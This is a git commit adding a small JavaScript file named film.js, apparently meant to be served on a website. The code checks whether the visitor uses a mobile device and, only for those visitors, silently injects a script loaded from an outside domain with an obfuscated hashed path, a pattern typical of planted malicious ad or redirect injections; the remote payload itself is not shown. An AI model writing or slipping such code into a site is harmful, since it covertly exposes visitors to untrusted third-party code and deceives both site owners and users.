42bfda70fe16305767c7b1a6ef5236dccecebf31
dork12 <127926288+yukrini@users.noreply.github.com>
2024-02-28 10:39:21 +0700

    film.js

---
+++ film.js
@@ -0,0 +1,10 @@
+		if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//arabcuff.com/0e/53/51/0e5351cf66eea83d15bc5c10af491d21.js',document.body||document.documentElement)
+	 }
+	 
+	
